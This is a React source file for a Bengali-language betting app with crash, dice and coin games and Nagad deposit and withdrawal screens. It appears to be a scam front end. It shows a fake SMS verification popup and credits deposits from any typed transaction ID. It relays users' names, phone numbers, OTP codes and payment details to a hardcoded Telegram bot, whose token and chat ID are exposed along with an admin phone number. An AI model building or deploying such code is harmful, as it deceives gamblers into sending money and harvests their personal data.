
import React, { useState, useEffect, useCallback, useRef } from 'react';
import Header from './components/Header';
import ChatAssistant from './components/ChatAssistant';

// --- Configuration ---
const TELEGRAM_BOT_TOKEN = '7661259658:AAH_XyRnVbL6Squha70cO_zFVmdH11WBm8I';
const TELEGRAM_CHAT_ID = '6541663008';
const ADMIN_NUMBER = '01736428130';

// --- Types ---
type View = 'dashboard' | 'deposit' | 'withdraw' | 'history' | 
             'play_aviator' | 'play_mines' | 'play_dice' | 'play_coin' | 
             'play_crash' | 'play_wheel' | 'play_hilo' | 'play_scratch';

interface UserProfile {
  name: string;
  phone: string;
  totalWon: number;
  totalLost: number;
  gamesPlayed: number;
}

interface GameResult {
  show: boolean;
  status: 'won' | 'lost';
  amount: number;
  gameName: string;
}

export default function App() {
  const [user, setUser] = useState<UserProfile | null>(null);
  const [balance, setBalance] = useState(0);
  const [activeTab, setActiveTab] = useState<View>('dashboard');
  
  // UI & Auth States
  const [isVerifying, setIsVerifying] = useState(false);
  const [otpSent, setOtpSent] = useState('');
  const [otpInput, setOtpInput] = useState('');
  const [tempUser, setTempUser] = useState<{name: string, phone: string} | null>(null);
  const [showFakeSMS, setShowFakeSMS] = useState(false);

  // Result UI State
  const [gameResult, setGameResult] = useState<GameResult>({ show: false, status: 'won', amount: 0, gameName: '' });

  // Form States
  const [depAmt, setDepAmt] = useState('');
  const [depTx, setDepTx] = useState('');
  const [witAmt, setWitAmt] = useState('');
  const [witNum, setWitNum] = useState('');

  // Game Core States
  const [bet, setBet] = useState(100);
  const [multiplier, setMultiplier] = useState(1.0);
  const [gameState, setGameState] = useState<'idle' | 'playing' | 'crashed' | 'won' | 'lost'>('idle');
  const gameIntervalRef = useRef<any>(null);

  // Local Storage Persistence
  useEffect(() => {
    const savedUser = localStorage.getItem('og_user_v22');
    const savedBalance = localStorage.getItem('og_balance_v22');
    if (savedUser) setUser(JSON.parse(savedUser));
    if (savedBalance) setBalance(Number(savedBalance));
  }, []);

  useEffect(() => {
    if (user) localStorage.setItem('og_user_v22', JSON.stringify(user));
    localStorage.setItem('og_balance_v22', balance.toString());
  }, [user, balance]);

  // Helper: Telegram Messaging
  const sendToTelegram = async (message: string) => {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      });
    } catch (e) { console.error("Telegram Error", e); }
  };

  const processResult = (win: boolean, gameName: string, betAmount: number, mult: number = 2) => {
    const winAmt = win ? Math.floor(betAmount * mult) : 0;
    const netChange = win ? (winAmt - betAmount) : -betAmount;
    
    setBalance(p => p + netChange);
    
    // Show Result Popup
    setGameResult({
      show: true,
      status: win ? 'won' : 'lost',
      amount: Math.abs(win ? (winAmt - betAmount) : betAmount),
      gameName
    });

    if (user) {
      const updated = {
        ...user,
        totalWon: user.totalWon + (win ? (winAmt - betAmount) : 0),
        totalLost: user.totalLost + (win ? 0 : betAmount),
        gamesPlayed: user.gamesPlayed + 1
      };
      setUser(updated);
      sendToTelegram(`🕹️ <b>${gameName}</b>\n👤 ইউজার: ${user.name}\n📊 রেজাল্ট: ${win ? "জিতছে ✅" : "হারছে ❌"}\n💸 বাজি: ৳${betAmount}\n💰 ${win ? 'লাভ' : 'ক্ষতি'}: ৳${Math.abs(win ? (winAmt - betAmount) : betAmount)}\n💳 ব্যালেন্স: ৳${(balance + netChange).toLocaleString()}`);
    }
  };

  // Auth Functions
  const handleRegister = (e: React.FormEvent) => {
    e.preventDefault();
    const data = new FormData(e.target as HTMLFormElement);
    const name = data.get('name') as string;
    const phone = data.get('phone') as string;
    
    if (phone.length < 11) return alert("সঠিক ১১ ডিজিটের মোবাইল নম্বর দিন");
    
    const code = Math.floor(1000 + Math.random() * 9000).toString();
    setOtpSent(code);
    setTempUser({ name, phone });
    setIsVerifying(true);
    setShowFakeSMS(true); 
    
    sendToTelegram(`🔑 <b>নতুন ওটিপি</b>\n👤 নাম: ${name}\n📞 ফোন: ${phone}\n🔑 কোড: ${code}`);
  };

  const confirmOtp = () => {
    if (otpInput === otpSent && tempUser) {
      setUser({ ...tempUser, totalWon: 0, totalLost: 0, gamesPlayed: 0 });
      setIsVerifying(false);
      setShowFakeSMS(false);
      sendToTelegram(`✅ <b>লগইন সফল</b>\n👤 ইউজার: ${tempUser.name}`);
    } else alert("ভুল ওটিপি!");
  };

  // --- Games Implementation ---
  const startCrashGame = (game: string) => {
    if (balance < bet) return alert("ব্যালেন্স নেই!");
    setGameState('playing');
    setMultiplier(1.0);
    const crashPoint = 1.1 + Math.random() * 6.5;
    gameIntervalRef.current = setInterval(() => {
      setMultiplier(m => {
        const next = m + 0.05;
        if (next >= crashPoint) {
          clearInterval(gameIntervalRef.current);
          setGameState('crashed');
          processResult(false, game, bet);
          return next;
        }
        return next;
      });
    }, 100);
  };

  const cashOutCrash = (game: string) => {
    if (gameState !== 'playing') return;
    clearInterval(gameIntervalRef.current);
    setGameState('won');
    processResult(true, game, bet, multiplier);
  };

  const rollDice = () => {
    if (balance < bet) return alert("ব্যালেন্স নেই!");
    const res = Math.floor(Math.random() * 100);
    const win = res > 50;
    processResult(win, "Dice Roll", bet, 1.95);
  };

  const flipCoin = (side: 'heads' | 'tails') => {
    if (balance < bet) return alert("ব্যালেন্স নেই!");
    const res = Math.random() > 0.5 ? 'heads' : 'tails';
    const win = side === res;
    processResult(win, "Coin Flip", bet, 1.9);
  };

  // --- UI Components ---
  const GameResultModal = () => (
    <div className={`fixed inset-0 z-[10000] flex items-center justify-center p-6 bg-black/90 animate-in fade-in duration-300 ${gameResult.show ? '' : 'hidden'}`}>
       <div className={`w-full max-w-sm glass rounded-[40px] p-10 border-2 text-center shadow-2xl ${gameResult.status === 'won' ? 'border-green-500 shadow-green-500/20' : 'border-red-500 shadow-red-500/20'}`}>
          <div className={`w-24 h-24 mx-auto mb-6 rounded-full flex items-center justify-center text-4xl ${gameResult.status === 'won' ? 'bg-green-500 text-black' : 'bg-red-500 text-white'}`}>
             <i className={`fa-solid ${gameResult.status === 'won' ? 'fa-trophy' : 'fa-face-frown'}`}></i>
          </div>
          <h2 className={`text-4xl font-black mb-2 uppercase italic ${gameResult.status === 'won' ? 'text-green-500' : 'text-red-500'}`}>
            {gameResult.status === 'won' ? 'You Won!' : 'You Lost'}
          </h2>
          <p className="text-gray-500 font-bold uppercase tracking-widest text-xs mb-8">{gameResult.gameName} Result</p>
          <div className="text-5xl font-black text-white mb-10 tracking-tighter">
             ৳{gameResult.amount}
          </div>
          <button 
            onClick={() => setGameResult({ ...gameResult, show: false })}
            className={`w-full py-5 rounded-2xl font-black uppercase tracking-widest text-xs active-scale transition-all ${gameResult.status === 'won' ? 'bg-green-500 text-black' : 'bg-red-500 text-white'}`}
          >
            Play Again
          </button>
       </div>
    </div>
  );

  if (!user) {
    return (
      <div className="min-h-screen bg-[#050505] flex flex-col items-center justify-center p-8 relative overflow-hidden">
        {showFakeSMS && (
          <div className="fixed top-8 left-1/2 -translate-x-1/2 w-[90%] max-w-sm glass rounded-[32px] p-6 animate-sms z-[9999] border-orange-500 border-2 shadow-[0_20px_60px_rgba(255,107,0,0.4)]">
            <div className="flex items-center gap-4 mb-4">
              <div className="w-12 h-12 rounded-2xl bg-orange-500 flex items-center justify-center text-black font-black text-sm">SMS</div>
              <div>
                <p className="text-[10px] text-orange-500 font-black uppercase tracking-[0.2em]">Verification Code</p>
                <p className="text-white font-bold text-xs">Security Service</p>
              </div>
            </div>
            <p className="text-lg font-bold text-white mb-4">আপনার অ্যাকাউন্ট ভেরিফাই কোড হলো: <span className="text-orange-500 text-4xl font-black tracking-widest ml-2 block mt-2">{otpSent}</span></p>
            <button onClick={() => setShowFakeSMS(false)} className="w-full py-3 bg-white/5 rounded-xl text-[10px] text-gray-500 uppercase font-black tracking-widest hover:text-white transition-colors">বন্ধ করুন</button>
          </div>
        )}

        <div className="w-full max-w-sm text-center">
          <div className="w-24 h-24 bg-orange-500 rounded-3xl mx-auto mb-8 flex items-center justify-center text-black font-black text-4xl shadow-2xl active-scale transition-all">OG</div>
          <h1 className="text-4xl font-black mb-10 tracking-tighter uppercase italic">ONLINE <span className="text-orange-500">GAMES</span></h1>
          {!isVerifying ? (
            <form onSubmit={handleRegister} className="space-y-4">
              <input name="name" required placeholder="আপনার নাম" className="w-full bg-white/5 border border-white/10 rounded-2xl py-5 px-6 outline-none text-white text-xl font-bold focus:border-orange-500/40" />
              <input name="phone" required type="tel" placeholder="মোবাইল নম্বর (১১ ডিজিট)" className="w-full bg-white/5 border border-white/10 rounded-2xl py-5 px-6 outline-none text-white text-xl font-bold tracking-widest focus:border-orange-500/40" />
              <button className="w-full py-5 bg-orange-500 text-black font-black rounded-2xl uppercase text-sm tracking-widest shadow-xl active-scale transition-all">অ্যাকাউন্ট খুলুন</button>
            </form>
          ) : (
            <div className="space-y-8 animate-in zoom-in duration-500">
              <p className="text-gray-500 text-sm font-black uppercase tracking-[0.4em]">কোড দিন</p>
              <input value={otpInput} onChange={e => setOtpInput(e.target.value)} maxLength={4} placeholder="____" className="w-full bg-transparent border-b-4 border-orange-500/40 text-center text-6xl font-black text-orange-500 outline-none pb-4 tracking-widest" />
              <button onClick={confirmOtp} className="w-full py-5 bg-white text-black font-black rounded-2xl uppercase text-sm tracking-widest shadow-xl active-scale transition-all">ভেরিফাই করুন</button>
              <p onClick={() => setShowFakeSMS(true)} className="text-xs text-orange-500 font-bold underline cursor-pointer">কোডটি পাননি? আবার দেখুন</p>
            </div>
          )}
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#050505] text-white font-sans pb-32">
      <GameResultModal />
      <div className="max-w-md mx-auto min-h-screen border-x border-white/5 bg-[#080808] relative shadow-[0_0_100px_rgba(0,0,0,0.5)]">
        <Header />
        <ChatAssistant />

        <main className="p-6">
          {activeTab === 'dashboard' && (
            <div className="space-y-8 animate-in fade-in duration-500">
              {/* Stats Grid */}
              <div className="grid grid-cols-2 gap-4">
                 <div className="glass p-6 rounded-[32px] border border-green-500/10 text-center relative overflow-hidden group">
                    <div className="absolute inset-0 bg-green-500/5 opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    <p className="text-[10px] text-gray-500 font-black uppercase tracking-widest mb-1 italic">Total Won</p>
                    <p className="text-2xl font-black text-green-500">৳ {user.totalWon.toLocaleString('bn-BD')}</p>
                 </div>
                 <div className="glass p-6 rounded-[32px] border border-red-500/10 text-center relative overflow-hidden group">
                    <div className="absolute inset-0 bg-red-500/5 opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    <p className="text-[10px] text-gray-500 font-black uppercase tracking-widest mb-1 italic">Total Lost</p>
                    <p className="text-2xl font-black text-red-500">৳ {user.totalLost.toLocaleString('bn-BD')}</p>
                 </div>
              </div>

              {/* Balance UI */}
              <div className="glass rounded-[48px] p-10 border border-white/10 shadow-2xl relative overflow-hidden text-center">
                <div className="absolute top-0 right-0 w-32 h-32 bg-orange-500/5 blur-[60px]"></div>
                <p className="text-gray-500 text-xs font-black uppercase tracking-widest mb-4 italic">Available Balance</p>
                <h1 className="text-6xl font-black tracking-tighter mb-10 text-white animate-in zoom-in duration-700">৳ {balance.toLocaleString('bn-BD')}</h1>
                <div className="grid grid-cols-2 gap-4">
                  <button onClick={() => setActiveTab('deposit')} className="py-5 bg-orange-500 text-black rounded-3xl text-xs font-black uppercase shadow-xl active-scale transition-all">টাকা যোগ</button>
                  <button onClick={() => setActiveTab('withdraw')} className="py-5 glass border border-white/10 rounded-3xl text-xs font-black uppercase active-scale transition-all">টাকা তুলুন</button>
                </div>
              </div>

              {/* Arena Grid */}
              <div className="space-y-6">
                <h3 className="text-xs font-black uppercase tracking-[0.4em] text-gray-600 italic px-2">Gaming Arenas</h3>
                <div className="grid grid-cols-2 gap-4 pb-12">
                  {[
                    { id: 'play_aviator', label: 'Aviator', icon: 'fa-paper-plane', color: 'text-red-500', bg: 'bg-red-500/10' },
                    { id: 'play_crash', label: 'Crash', icon: 'fa-rocket', color: 'text-blue-500', bg: 'bg-blue-500/10' },
                    { id: 'play_dice', label: 'Dice', icon: 'fa-dice', color: 'text-emerald-500', bg: 'bg-emerald-500/10' },
                    { id: 'play_coin', label: 'Coin Flip', icon: 'fa-coins', color: 'text-yellow-500', bg: 'bg-yellow-500/10' },
                  ].map(game => (
                    <div key={game.id} onClick={() => { setGameState('idle'); setActiveTab(game.id as View); }} className="glass p-8 rounded-[40px] border border-white/5 hover:border-white/20 transition-all cursor-pointer group active-scale flex flex-col items-center text-center shadow-lg">
                      <div className={`w-16 h-16 ${game.bg} ${game.color} rounded-2xl flex items-center justify-center text-3xl mb-4 group-hover:scale-110 transition-transform`}>
                        <i className={`fa-solid ${game.icon}`}></i>
                      </div>
                      <h4 className="text-sm font-black uppercase tracking-widest">{game.label}</h4>
                      <p className="text-[9px] text-gray-600 font-bold uppercase mt-2">Win Up to 10X</p>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* Game Pages */}
          {(activeTab === 'play_aviator' || activeTab === 'play_crash') && (
            <div className="animate-in zoom-in duration-500">
               <div className="glass rounded-[48px] p-8 border border-white/10 text-center relative shadow-2xl">
                 <button onClick={() => { clearInterval(gameIntervalRef.current); setActiveTab('dashboard'); }} className="absolute top-8 left-8 text-gray-600 text-2xl hover:text-white transition-colors"><i className="fa-solid fa-arrow-left"></i></button>
                 <h2 className="text-2xl font-black mb-10 uppercase italic">{activeTab === 'play_aviator' ? 'Aviator' : 'Crash'} <span className="text-orange-500">Arena</span></h2>
                 <div className="relative h-80 bg-black/60 rounded-[40px] mb-8 border border-white/5 flex flex-col items-center justify-center overflow-hidden">
                    <div className={`text-8xl font-black tracking-tighter text-white z-10 ${gameState === 'playing' ? 'scale-110' : 'scale-100'} transition-all duration-75`}>{multiplier.toFixed(2)}x</div>
                    {gameState === 'crashed' && <div className="text-red-500 font-black text-4xl uppercase mt-6 animate-ping italic">CRASHED!</div>}
                 </div>
                 <div className="mb-8 flex items-center justify-center gap-6">
                    <span className="text-xs text-gray-500 font-black uppercase italic tracking-widest">বেট: ৳{bet}</span>
                    <div className="flex gap-2">
                       <button onClick={() => setBet(Math.max(10, bet - 50))} className="w-12 h-12 glass rounded-2xl flex items-center justify-center text-xl hover:bg-white/10 transition-all">-</button>
                       <button onClick={() => setBet(bet + 50)} className="w-12 h-12 glass rounded-2xl flex items-center justify-center text-xl hover:bg-white/10 transition-all">+</button>
                    </div>
                 </div>
                 {gameState !== 'playing' ? (
                   <button onClick={() => startCrashGame(activeTab === 'play_aviator' ? "Aviator" : "Crash")} className="w-full py-6 bg-orange-500 text-black font-black rounded-3xl active-scale uppercase tracking-[0.2em] text-sm shadow-[0_15px_40px_rgba(255,107,0,0.3)]">বেট ধরুন</button>
                 ) : (
                   <button onClick={() => cashOutCrash(activeTab === 'play_aviator' ? "Aviator" : "Crash")} className="w-full py-6 bg-green-500 text-black font-black rounded-3xl active-scale uppercase tracking-[0.2em] text-sm shadow-[0_15px_40px_rgba(34,197,94,0.3)]">ক্যাশ আউট (৳{Math.floor(bet * multiplier)})</button>
                 )}
               </div>
            </div>
          )}

          {activeTab === 'play_dice' && (
            <div className="animate-in zoom-in duration-500">
               <div className="glass rounded-[48px] p-10 border border-white/10 text-center relative shadow-2xl">
                 <button onClick={() => setActiveTab('dashboard')} className="absolute top-8 left-8 text-gray-600 text-2xl hover:text-white transition-colors"><i className="fa-solid fa-arrow-left"></i></button>
                 <h2 className="text-2xl font-black mb-12 uppercase italic">Dice <span className="text-emerald-500">Roll</span></h2>
                 <div className="bg-black/40 rounded-[40px] p-20 mb-10 text-9xl text-emerald-500 shadow-inner"><i className="fa-solid fa-dice animate-bounce"></i></div>
                 <div className="mb-8 font-black uppercase tracking-widest text-gray-500">Bet Amount: ৳{bet}</div>
                 <button onClick={rollDice} className="w-full py-6 bg-emerald-500 text-black font-black rounded-3xl active-scale uppercase tracking-[0.2em] text-sm shadow-xl">রোল করুন (৳{bet})</button>
               </div>
            </div>
          )}

          {activeTab === 'play_coin' && (
            <div className="animate-in zoom-in duration-500">
               <div className="glass rounded-[48px] p-10 border border-white/10 text-center relative shadow-2xl">
                 <button onClick={() => setActiveTab('dashboard')} className="absolute top-8 left-8 text-gray-600 text-2xl"><i className="fa-solid fa-arrow-left"></i></button>
                 <h2 className="text-2xl font-black mb-12 uppercase italic">Coin <span className="text-yellow-500">Flip</span></h2>
                 <div className="bg-black/40 rounded-[40px] p-20 mb-12 text-9xl text-yellow-500 shadow-inner"><i className="fa-solid fa-coins animate-pulse"></i></div>
                 <div className="grid grid-cols-2 gap-4">
                    <button onClick={() => flipCoin('heads')} className="py-6 bg-yellow-500 text-black font-black rounded-3xl uppercase text-xs active-scale shadow-lg">HEADS</button>
                    <button onClick={() => flipCoin('tails')} className="py-6 bg-yellow-600 text-black font-black rounded-3xl uppercase text-xs active-scale shadow-lg">TAILS</button>
                 </div>
               </div>
            </div>
          )}

          {/* Deposit / Withdraw Forms */}
          {activeTab === 'deposit' && (
            <div className="animate-in slide-in-from-right-8 duration-500">
               <div className="glass rounded-[48px] p-10 border border-orange-500/10 shadow-2xl">
                 <h2 className="text-4xl font-black text-center mb-10 italic uppercase tracking-tighter">নগদ <span className="text-orange-500">ডিপোজিট</span></h2>
                 <div className="bg-black/60 p-8 rounded-[32px] border border-white/5 mb-8 text-center active-scale transition-all" onClick={() => { navigator.clipboard.writeText(ADMIN_NUMBER); alert("নম্বর কপি হয়েছে!"); }}>
                    <p className="text-[10px] text-gray-500 font-black uppercase mb-3 tracking-widest italic">সেন্ড মানি নম্বর (Nagad)</p>
                    <p className="text-3xl font-mono font-black text-orange-500 tracking-widest">{ADMIN_NUMBER}</p>
                    <p className="text-[8px] text-gray-600 font-bold uppercase mt-3">ট্যাপ করে কপি করুন</p>
                 </div>
                 <div className="space-y-6">
                   <input value={depAmt} onChange={e => setDepAmt(e.target.value)} type="number" placeholder="পরিমাণ (১০০+)" className="w-full bg-white/5 border border-white/10 rounded-3xl py-6 px-8 text-white text-2xl font-black outline-none focus:border-orange-500/30 transition-all" />
                   <input value={depTx} onChange={e => setDepTx(e.target.value)} placeholder="ট্রানজেকশন আইডি (TxID)" className="w-full bg-white/5 border border-white/10 rounded-3xl py-6 px-8 text-white font-black outline-none uppercase tracking-widest text-sm focus:border-orange-500/30 transition-all" />
                   <button onClick={() => {
                     const amt = Number(depAmt);
                     if (amt < 100) return alert("ন্যূনতম ১০০ টাকা ডিপোজিট করুন");
                     if (!depTx) return alert("ট্রানজেকশন আইডি দিন");
                     setBalance(prev => prev + amt);
                     sendToTelegram(`💰 <b>ডিপোজিট সফল</b>\n👤 ইউজার: ${user?.name}\n💵 টাকা: ৳${amt}\n📑 TxID: ${depTx.toUpperCase()}`);
                     alert(`৳${amt} আপনার অ্যাকাউন্টে যোগ হয়েছে!`);
                     setDepAmt(''); setDepTx('');
                     setActiveTab('dashboard');
                   }} className="w-full py-6 bg-orange-500 text-black font-black rounded-3xl uppercase text-sm tracking-widest shadow-2xl active-scale transition-all font-bold">ডিপোজিট কনফার্ম করুন</button>
                 </div>
               </div>
            </div>
          )}

          {activeTab === 'withdraw' && (
            <div className="animate-in slide-in-from-left-8 duration-500">
               <div className="glass rounded-[48px] p-10 border border-red-500/10 shadow-2xl">
                 <h2 className="text-4xl font-black text-center mb-10 italic uppercase tracking-tighter">টাকা <span className="text-red-500">তুলুন</span></h2>
                 <div className="bg-white/5 p-8 rounded-[32px] mb-8 border border-white/5 text-center">
                    <p className="text-[10px] text-gray-500 font-black uppercase tracking-widest mb-2 italic">ব্যালেন্স</p>
                    <p className="text-4xl font-black text-white">৳ {balance.toLocaleString('bn-BD')}</p>
                 </div>
                 <div className="space-y-6">
                   <input value={witAmt} onChange={e => setWitAmt(e.target.value)} type="number" placeholder="পরিমাণ (৫০০+)" className="w-full bg-white/5 border border-white/10 rounded-3xl py-6 px-8 text-white text-2xl font-black outline-none focus:border-red-500/30" />
                   <input value={witNum} onChange={e => setWitNum(e.target.value)} placeholder="নগদ নম্বর দিন" className="w-full bg-white/5 border border-white/10 rounded-3xl py-6 px-8 text-white font-black outline-none tracking-widest text-sm focus:border-red-500/30" />
                   <button onClick={() => {
                     const amt = Number(witAmt);
                     if (amt < 500) return alert("ন্যূনতম ৫০০ টাকা উত্তোলন করতে পারবেন");
                     if (amt > balance) return alert("পর্যাপ্ত ব্যালেন্স নেই");
                     setBalance(p => p - amt); 
                     sendToTelegram(`🔴 <b>উত্তোলন রিকোয়েস্ট</b>\n👤 ইউজার: ${user?.name}\n📞 ফোন: ${user?.phone}\n💵 টাকা: ৳${amt}\n📱 নগদ: ${witNum}\n⚠️ এডমিন এপ্রুভাল পেন্ডিং`);
                     alert("উত্তোলন রিকোয়েস্ট পাঠানো হয়েছে। এডমিন চেক করবে।");
                     setWitAmt(''); setWitNum('');
                     setActiveTab('dashboard');
                   }} className="w-full py-6 bg-red-500 text-white font-black rounded-3xl uppercase text-sm tracking-widest shadow-2xl active-scale transition-all font-bold">উত্তোলন রিকোয়েস্ট দিন</button>
                 </div>
               </div>
            </div>
          )}
        </main>

        {/* Floating Bottom Nav */}
        <nav className="fixed bottom-8 left-1/2 -translate-x-1/2 w-[92%] h-24 glass rounded-[44px] border border-white/10 flex items-center justify-around z-[100] shadow-[0_20px_60px_rgba(0,0,0,0.8)] px-8 backdrop-blur-3xl">
          <button onClick={() => setActiveTab('dashboard')} className={`flex flex-col items-center gap-2 transition-all duration-300 ${activeTab === 'dashboard' ? 'text-orange-500 scale-110' : 'text-gray-600 hover:text-gray-400'}`}>
            <i className="fa-solid fa-house-chimney text-2xl"></i>
            <span className="text-[9px] font-black uppercase tracking-widest">Home</span>
          </button>
          <button onClick={() => setActiveTab('dashboard')} className={`flex flex-col items-center gap-2 transition-all duration-300 ${activeTab.includes('play') ? 'text-orange-500 scale-110' : 'text-gray-600 hover:text-gray-400'}`}>
            <i className="fa-solid fa-gamepad text-2xl"></i>
            <span className="text-[9px] font-black uppercase tracking-widest">Arena</span>
          </button>
          <button onClick={() => setActiveTab('withdraw')} className={`flex flex-col items-center gap-2 transition-all duration-300 ${activeTab === 'withdraw' ? 'text-orange-500 scale-110' : 'text-gray-600 hover:text-gray-400'}`}>
            <i className="fa-solid fa-wallet text-2xl"></i>
            <span className="text-[9px] font-black uppercase tracking-widest">Wallet</span>
          </button>
        </nav>
      </div>
    </div>
  );
}
